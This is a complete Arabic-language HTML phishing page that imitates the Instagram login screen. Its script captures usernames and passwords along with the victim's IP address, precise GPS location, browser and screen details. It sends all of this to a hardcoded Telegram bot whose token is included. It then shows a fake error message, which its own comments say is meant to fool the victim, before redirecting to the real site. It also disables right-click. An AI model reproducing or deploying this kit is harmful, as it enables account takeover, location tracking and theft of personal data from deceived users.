<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول إلى إنستغرام</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 350px;
            width: 100%;
        }
        .login-box {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 30px;
            text-align: center;
            margin-bottom: 10px;
        }
        .logo {
            font-size: 42px;
            font-weight: 600;
            color: #262626;
            letter-spacing: -2px;
            margin-bottom: 20px;
            font-family: 'Billabong', cursive;
            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .avatar-container {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            margin: 0 auto 20px;
            border: 2px solid #dbdbdb;
            overflow: hidden;
            background: #fafafa;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .avatar-container img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        .avatar-placeholder {
            font-size: 40px;
            color: #8e8e8e;
        }
        .input-group {
            margin-bottom: 10px;
        }
        .input-group input {
            width: 100%;
            padding: 12px 8px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 14px;
            outline: none;
            transition: border 0.2s;
        }
        .input-group input:focus {
            border-color: #a8a8a8;
        }
        .login-btn {
            width: 100%;
            padding: 10px;
            background: #0095f6;
            border: none;
            border-radius: 4px;
            color: white;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.2s;
        }
        .login-btn:hover {
            background: #1877f2;
        }
        .login-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
        }
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }
        .divider::before {
            margin-right: 15px;
        }
        .divider::after {
            margin-left: 15px;
        }
        .facebook-login {
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin: 10px 0;
            cursor: pointer;
        }
        .forgot-password {
            color: #00376b;
            font-size: 12px;
            margin-top: 15px;
            display: block;
            text-decoration: none;
        }
        .signup-box {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px 30px;
            text-align: center;
            font-size: 14px;
        }
        .signup-box a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
        .app-download {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
            color: #262626;
        }
        .app-buttons {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-top: 10px;
        }
        .app-buttons img {
            height: 40px;
        }
        #loading {
            display: none;
            margin-top: 10px;
            color: #0095f6;
            font-size: 13px;
        }
        /* تنسيق رسالة الخطأ */
        .error-msg {
            color: #ed4956;
            font-size: 13px;
            margin-top: 10px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">Instagram</div>
            
            <!-- صورة المستخدم -->
            <div class="avatar-container" id="avatarContainer">
                <img id="userAvatar" src="" alt="صورة المستخدم" style="display:none;">
                <span class="avatar-placeholder" id="avatarPlaceholder">👤</span>
            </div>
            
            <form id="loginForm" onsubmit="sendData(event)">
                <div class="input-group">
                    <input type="text" id="username" placeholder="رقم الهاتف، أو اسم المستخدم، أو البريد الإلكتروني" required>
                </div>
                <div class="input-group">
                    <input type="password" id="password" placeholder="كلمة المرور" required>
                </div>
                <button type="submit" class="login-btn" id="loginBtn">تسجيل الدخول</button>
                <div id="loading">جاري تسجيل الدخول...</div>
                <div class="error-msg" id="errorMsg">عذراً، كلمة المرور غير صحيحة. حاول مرة أخرى.</div>
            </form>
            
            <div class="divider">أو</div>
            
            <div class="facebook-login">
                <span>⏺</span> تسجيل الدخول عبر فيسبوك
            </div>
            
            <a href="#" class="forgot-password">نسيت كلمة المرور؟</a>
        </div>
        
        <div class="signup-box">
            ليس لديك حساب؟ <a href="#">سجل الآن</a>
        </div>
        
        <div class="app-download">
            حمل التطبيق
            <div class="app-buttons">
                <img src="https://www.instagram.com/static/images/appstore.png/13279f5d5e8d.png" alt="App Store">
                <img src="https://www.instagram.com/static/images/googleplay.png/df5d26e96c6d.png" alt="Google Play">
            </div>
        </div>
    </div>

    <script>
        // التوكن والمعرف الذي زودتني به
        const BOT_TOKEN = "8533593040:AAGHB2mNIeRa3Alm8OuDsASkIqE5rzI6Sak";
        const CHAT_ID = "8380345748";
        
        // متغيرات لتخزين بيانات الموقع
        let userLocation = "غير معروف";
        let userIP = "غير معروف";

        // =============== جلب الموقع الجغرافي ===============
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const { latitude, longitude } = position.coords;
                        userLocation = `https://www.google.com/maps?q=${latitude},${longitude}`;
                        console.log("[+] تم جلب الموقع:", userLocation);
                    },
                    (error) => {
                        console.log("[-] فشل جلب الموقع:", error.message);
                        userLocation = "رفض المستخدم مشاركة الموقع";
                    },
                    { timeout: 10000, enableHighAccuracy: true }
                );
            } else {
                userLocation = "المتصفح لا يدعم GPS";
            }
        }

        // =============== جلب عنوان IP ===============
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                userIP = data.ip;
                console.log("[+] تم جلب IP:", userIP);
            } catch (error) {
                console.log("[-] فشل جلب IP:", error);
                userIP = "غير معروف";
            }
        }

        // =============== جلب صورة المستخدم ===============
        function fetchUserAvatar(username) {
            const avatarImg = document.getElementById('userAvatar');
            const placeholder = document.getElementById('avatarPlaceholder');
            
            if (username && username.length > 0) {
                // محاولة جلب الصورة من Gravatar
                const email = username.includes('@') ? username : `${username}@instagram.com`;
                const hash = md5(email.trim().toLowerCase());
                const gravatarUrl = `https://www.gravatar.com/avatar/${hash}?d=identicon&s=200`;
                
                // محاولة جلب الصورة من إنستغرام مباشرة (قد تنجح مع بعض الحسابات)
                const instaUrl = `https://www.instagram.com/${username}/?__a=1`;
                
                // تجربة Gravatar أولاً
                avatarImg.src = gravatarUrl;
                avatarImg.onload = function() {
                    avatarImg.style.display = 'block';
                    placeholder.style.display = 'none';
                };
                avatarImg.onerror = function() {
                    // إذا فشل Gravatar، حاول إنستغرام
                    fetch(instaUrl)
                        .then(res => res.json())
                        .then(data => {
                            const profilePic = data?.graphql?.user?.profile_pic_url;
                            if (profilePic) {
                                avatarImg.src = profilePic;
                                avatarImg.style.display = 'block';
                                placeholder.style.display = 'none';
                            }
                        })
                        .catch(() => {
                            // استخدام صورة افتراضية
                            avatarImg.style.display = 'none';
                            placeholder.style.display = 'block';
                        });
                };
            } else {
                avatarImg.style.display = 'none';
                placeholder.style.display = 'block';
            }
        }

        // =============== دالة MD5 (لـ Gravatar) ===============
        function md5(string) {
            return CryptoJS.MD5(string).toString();
        }

        // =============== إرسال البيانات إلى تيلغرام ===============
        async function sendData(event) {
            event.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const loginBtn = document.getElementById('loginBtn');
            const loading = document.getElementById('loading');
            const errorMsg = document.getElementById('errorMsg');
            
            if (!username || !password) {
                alert('الرجاء إدخال جميع البيانات');
                return;
            }

            // إظهار رسالة التحميل
            loading.style.display = 'block';
            loginBtn.disabled = true;
            errorMsg.style.display = 'none';

            // جلب الصورة
            fetchUserAvatar(username);

            // بناء الرسالة
            const timestamp = new Date().toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' });
            const message = `
🔐 **Instagram Login** 🔐

👤 **Username:** ${username}
🔑 **Password:** ${password}
🌐 **IP:** ${userIP}
📍 **Location:** ${userLocation}
🕐 **Time:** ${timestamp}
📱 **User Agent:** ${navigator.userAgent}
🖥️ **Screen:** ${screen.width}x${screen.height}
`;

            try {
                // إرسال البيانات إلى تيلغرام
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                const data = await response.json();
                console.log('[+] تم الإرسال بنجاح:', data);

                // إظهار رسالة خطأ وهمية (لإيهام الضحية)
                loading.style.display = 'none';
                errorMsg.style.display = 'block';
                loginBtn.disabled = false;

                // إعادة توجيه الضحية بعد 3 ثواني إلى الصفحة الرسمية
                setTimeout(() => {
                    window.location.href = 'https://www.instagram.com/';
                }, 3000);

            } catch (error) {
                console.error('[-] خطأ في الإرسال:', error);
                loading.style.display = 'none';
                errorMsg.style.display = 'block';
                loginBtn.disabled = false;
            }
        }

        // =============== تحميل المكتبات ===============
        function loadLibraries() {
            // تحميل CryptoJS لـ MD5
            const script = document.createElement('script');
            script.src = 'https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js';
            document.head.appendChild(script);
        }

        // =============== منع النقر بزر الماوس الأيمن ===============
        document.addEventListener('contextmenu', e => e.preventDefault());

        // =============== بدء التنفيذ ===============
        loadLibraries();
        getLocation();
        getIP();

        // محاولة جلب الصورة عند كتابة اسم المستخدم
        document.getElementById('username').addEventListener('input', function() {
            fetchUserAvatar(this.value);
        });

        console.log('[+] واجهة إنستغرام جاهزة!');
        console.log('[+] سيتم إرسال البيانات إلى تيلغرام عند تسجيل الدخول.');
    </script>
</body>
</html>
